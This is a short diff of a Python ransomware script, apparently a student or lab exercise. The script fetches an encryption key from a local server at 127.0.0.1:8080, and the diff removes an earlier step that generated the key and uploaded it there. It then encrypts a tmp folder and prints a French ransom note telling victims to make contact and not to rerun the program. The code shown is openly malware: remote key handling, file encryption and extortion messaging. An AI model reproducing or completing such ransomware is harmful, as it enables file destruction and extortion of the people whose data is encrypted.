@@ -145,6 +145,12 @@ if __name__ == '__main__':
     
     rware = Ransomware()
 
+    url = 'http://127.0.0.1:8080/keyfile.txt'
+        
+    keyfile = requests.get(url)
+
+    keyfile = keyfile.text
+    
     if action == 'decrypt':
         """
         keyf = requests.get(url + "/keyfile", stream=True)
@@ -160,19 +166,6 @@ if __name__ == '__main__':
 
         print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE MAIN SINON VIS FICHIERS SERONT PERDUS.")    
         
-        rware.generate_key()
-        print("coucou")
-        rware.write_key('keyfile')
+        rware.read_key(keyfile)
         rware.crypt_tmp(local_tmp)
-
-
-        url = 'http://127.0.0.1:8080/keyfile'
-        files = {'file': open('keyfile', 'rb')}
-
-        
-        r = requests.post(url, files=files)
-
-        #r = requests.get(url='127.0.0.1',params =keyfile, port 8080)
-        r = requests.get(url)
-        r= r.text
 
